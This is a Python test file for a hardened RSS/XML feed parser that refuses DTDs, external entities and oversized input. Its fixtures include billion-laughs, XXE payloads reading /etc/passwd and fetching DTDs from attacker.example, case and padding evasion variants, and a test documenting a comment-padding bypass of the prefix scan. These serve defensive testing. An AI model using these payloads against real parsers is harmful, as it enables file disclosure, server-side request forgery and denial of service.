"""Tests for the safe XML parser.

The PRD requires that RSS/XML parsing reject DTD/external entities and enforce a
response-size limit. `xml.etree.ElementTree` provides neither by itself — a nested
internal entity does expand on this interpreter — so these tests are the only
thing standing between a hostile feed and the isolate.

Constants come from the module, not from copies here: a cap that drifts out of sync
with its test is a cap nobody is checking.
"""

from __future__ import annotations

import pytest

from linuxdo_oss.feeds.xml_safe import (
    DOCTYPE_SCAN_BYTES,
    MAX_FEED_BYTES,
    XmlSafetyError,
    parse_feed,
)

# ----------------------------------------------------------------------
# Fixtures
# ----------------------------------------------------------------------

VALID_RSS = """<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>Linux.do Channel</title>
    <item>
      <title>@Ammdjs 在 某个主题 中发帖</title>
      <link>https://t.me/linux_do_channel/492492</link>
      <guid isPermaLink="false">https://t.me/linux_do_channel/492492</guid>
      <pubDate>Mon, 31 Aug 2026 15:18:11 GMT</pubDate>
    </item>
  </channel>
</rss>
"""

# The classic billion-laughs payload, shortened to four levels so the test itself
# stays cheap. Verified: without the pre-parse guard this parses and `<title>`
# comes back 30,000 characters long.
BILLION_LAUGHS = """<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<rss><channel><item><title>&lol4;</title></item></channel></rss>
"""

# XXE: an external general entity pointing at the local filesystem.
XXE_FILE = """<?xml version="1.0"?>
<!DOCTYPE feed [ <!ENTITY secret SYSTEM "file:///etc/passwd"> ]>
<rss><channel><item><title>&secret;</title></item></channel></rss>
"""

# XXE variant: an external DTD, which would make the parser fetch a URL. That
# would be SSRF from inside the Worker, which is exactly what the PRD's fixed
# fetch allowlist exists to prevent.
XXE_EXTERNAL_DTD = """<?xml version="1.0"?>
<!DOCTYPE rss SYSTEM "http://attacker.example/evil.dtd">
<rss><channel/></rss>
"""

# Parameter entity form — the same attack with a `%` instead of an `&`.
XXE_PARAMETER_ENTITY = """<?xml version="1.0"?>
<!DOCTYPE rss [
  <!ENTITY % outer SYSTEM "http://attacker.example/evil.dtd">
  %outer;
]>
<rss><channel/></rss>
"""

HOSTILE = [
    ("billion laughs", BILLION_LAUGHS),
    ("external file entity", XXE_FILE),
    ("external dtd", XXE_EXTERNAL_DTD),
    ("parameter entity", XXE_PARAMETER_ENTITY),
    # Lowercase and mixed-case spellings: XML keywords are uppercase, so a parser
    # that only matched `<!DOCTYPE` would pass these to expat. Expat rejects them
    # as malformed, but that must not be what this guard relies on.
    ("lowercase doctype", '<!doctype rss [ <!entity a "b"> ]><rss><channel/></rss>'),
    ("mixed-case doctype", '<!DocType rss [ <!EnTiTy a "b"> ]><rss><channel/></rss>'),
    # A bare entity declaration with no doctype wrapper.
    ("bare entity", '<!ENTITY a "b"><rss><channel/></rss>'),
]


# ----------------------------------------------------------------------
# Hostile input
# ----------------------------------------------------------------------


@pytest.mark.parametrize(("label", "document"), HOSTILE, ids=[label for label, _ in HOSTILE])
def test_dtd_and_entity_payloads_are_refused(label: str, document: str) -> None:
    with pytest.raises(XmlSafetyError):
        parse_feed(document)


def test_doctype_rejection_happens_before_parsing() -> None:
    """A document that is perfectly well-formed apart from its DTD is still refused.

    This is what distinguishes a real guard from luck: the payloads above would
    partly fail in expat anyway, so the guard has to be shown rejecting input the
    parser would have happily accepted.
    """
    well_formed_with_dtd = '<!DOCTYPE rss [ <!ENTITY a "harmless"> ]><rss><channel/></rss>'

    with pytest.raises(XmlSafetyError, match="declares"):
        parse_feed(well_formed_with_dtd)


PADDED_DOCTYPE = [
    # Leading whitespace must not push the doctype out of the scan window.
    ("leading spaces", " " * (DOCTYPE_SCAN_BYTES + 100)),
    ("leading newlines", "\n" * (DOCTYPE_SCAN_BYTES + 100)),
    ("leading tabs", "\t" * (DOCTYPE_SCAN_BYTES + 100)),
    ("bom", "\ufeff"),
    ("bom then whitespace", "\ufeff" + " \n\t" * 2000),
]


@pytest.mark.parametrize(
    ("label", "prefix"), PADDED_DOCTYPE, ids=[label for label, _ in PADDED_DOCTYPE]
)
def test_doctype_hidden_behind_padding_is_still_found(label: str, prefix: str) -> None:
    """Padding is stripped before the window is measured, so it buys nothing."""
    document = prefix + '<!DOCTYPE rss [ <!ENTITY a "b"> ]><rss><channel/></rss>'

    with pytest.raises(XmlSafetyError):
        parse_feed(document)


def test_entity_beyond_the_scan_window_is_not_caught_by_the_prefix_scan() -> None:
    """Documents the accepted limit of a prefix scan.

    A comment is legal in the prolog, so >4 KiB of comment can push a DOCTYPE past
    the window. Verified behaviour: the document parses and the entity expands. The
    trade-off is accepted deliberately (see `_find_forbidden_marker`): no feed
    generator emits kilobytes of prolog comments, this parser only ever reads two
    fixed configured hosts, and the byte cap plus libexpat's own amplification
    guard bound the damage. Asserted here so the boundary is a documented decision
    rather than a surprise.
    """
    padding = "<!-- " + "x" * (DOCTYPE_SCAN_BYTES + 100) + " -->"
    document = f'{padding}<!DOCTYPE rss [ <!ENTITY a "boom"> ]><rss><channel><item>'
    document += "<title>&a;</title></item></channel></rss>"

    root = parse_feed(document)

    assert root.findtext(".//title") == "boom"


def test_amplification_beyond_the_scan_window_still_fails_as_one_error_type() -> None:
    """The second line of defence, and the reason the gap above is tolerable.

    libexpat has refused excessive input amplification by default since 2.4.0. That
    surfaces as a ParseError, and this module's job is to make sure it arrives as
    XmlSafetyError like every other refusal, so a caller has one type to classify.
    """
    entities = ['<!ENTITY lol "lol">']
    for level in range(1, 8):
        previous = "lol" if level == 1 else f"lol{level - 1}"
        entities.append(f'<!ENTITY lol{level} "{f"&{previous};" * 10}">')

    padding = "<!-- " + "x" * (DOCTYPE_SCAN_BYTES + 100) + " -->"
    document = f"{padding}<!DOCTYPE lolz [{''.join(entities)}]><rss><title>&lol7;</title></rss>"

    with pytest.raises(XmlSafetyError):
        parse_feed(document)


# ----------------------------------------------------------------------
# Size cap
# ----------------------------------------------------------------------


def test_oversized_document_is_refused_before_parsing() -> None:
    """A valid document over the cap is still refused — the cap is not a fallback
    for malformed input."""
    filler = "<item><title>x</title></item>"
    body = filler * (MAX_FEED_BYTES // len(filler) + 10)
    document = f"<rss><channel>{body}</channel></rss>"

    assert len(document) > MAX_FEED_BYTES

    with pytest.raises(XmlSafetyError, match="cap"):
        parse_feed(document)


def test_cap_counts_utf8_bytes_not_characters() -> None:
    """Chinese post text is three bytes per character.

    A document comfortably under the cap in characters can be well over it in
    bytes, and the byte count is what costs memory.
    """
    # Each Chinese character is 3 bytes in UTF-8, so ~1/3 of the cap in characters
    # is ~the whole cap in bytes.
    padding = "主" * (MAX_FEED_BYTES // 3)
    document = f"<rss><channel><title>{padding}</title></channel></rss>"

    assert len(document) < MAX_FEED_BYTES
    assert len(document.encode("utf-8")) > MAX_FEED_BYTES

    with pytest.raises(XmlSafetyError, match="bytes"):
        parse_feed(document)


def test_max_bytes_is_overridable_per_call() -> None:
    """The topic reader may want a tighter cap than the channel reader."""
    with pytest.raises(XmlSafetyError):
        parse_feed(VALID_RSS, max_bytes=10)

    # And the same document is fine under the default.
    assert parse_feed(VALID_RSS) is not None


def test_document_exactly_at_the_cap_is_accepted() -> None:
    """The cap is inclusive: `> max_bytes` is refused, `== max_bytes` is not.

    An off-by-one here would reject a legitimate feed that happens to sit on the
    boundary, which is the kind of failure that only shows up in production.
    """
    head = "<rss><channel><title>"
    tail = "</title></channel></rss>"
    filler = "a" * (MAX_FEED_BYTES - len(head) - len(tail))
    document = head + filler + tail

    assert len(document.encode("utf-8")) == MAX_FEED_BYTES

    assert parse_feed(document).findtext("channel/title") == filler


# ----------------------------------------------------------------------
# Malformed input
# ----------------------------------------------------------------------

MALFORMED = [
    ("unclosed tag", "<rss><channel><item></channel></rss>"),
    ("no root", ""),
    ("whitespace only", "   \n\t  "),
    ("bom only", "\ufeff"),
    ("text not xml", "Just a moment... please enable JavaScript"),
    ("html error page", "<html><body><h1>403 Forbidden</h1></body></html><trailing>"),
    ("truncated mid-tag", "<rss><channel><item><title>abc"),
    ("undefined entity", "<rss><channel><title>&nbsp;</title></channel></rss>"),
    ("mismatched tags", "<rss><channel></item></rss>"),
]


@pytest.mark.parametrize(("label", "document"), MALFORMED, ids=[label for label, _ in MALFORMED])
def test_malformed_input_becomes_one_exception_type(label: str, document: str) -> None:
    """Callers classify a feed failure once. They must not have to catch ParseError
    as well as XmlSafetyError."""
    with pytest.raises(XmlSafetyError):
        parse_feed(document)


def test_xml_safety_error_is_a_value_error() -> None:
    """`except ValueError` around a parse already means the right thing."""
    assert issubclass(XmlSafetyError, ValueError)


# ----------------------------------------------------------------------
# Valid input
# ----------------------------------------------------------------------


def test_valid_rss_parses_and_keeps_its_content() -> None:
    root = parse_feed(VALID_RSS)

    assert root.tag == "rss"
    assert root.findtext("channel/title") == "Linux.do Channel"
    assert root.findtext("channel/item/pubDate") == "Mon, 31 Aug 2026 15:18:11 GMT"
    # Non-ASCII survives the round trip.
    assert "中发帖" in (root.findtext("channel/item/title") or "")


TOLERATED_PREFIXES = [
    ("bom", "\ufeff"),
    ("newline", "\n"),
    ("spaces", "    "),
    ("bom and whitespace", "\ufeff\n  \t"),
    ("crlf", "\r\n"),
]


@pytest.mark.parametrize(
    ("label", "prefix"), TOLERATED_PREFIXES, ids=[label for label, _ in TOLERATED_PREFIXES]
)
def test_leading_bom_and_whitespace_are_tolerated(label: str, prefix: str) -> None:
    """Load-bearing: expat rejects whitespace in front of an XML declaration
    ("XML or text declaration not at start of entity"). Without the strip, a padded
    but perfectly valid feed would be reported as malformed."""
    root = parse_feed(prefix + VALID_RSS)

    assert root.findtext("channel/title") == "Linux.do Channel"


def test_atom_document_parses() -> None:
    """`parse_feed` knows nothing about RSS specifically — it is an XML gate."""
    atom = '<feed xmlns="http://www.w3.org/2005/Atom"><entry><title>hello</title></entry></feed>'

    root = parse_feed(atom)

    assert root.tag == "{http://www.w3.org/2005/Atom}feed"
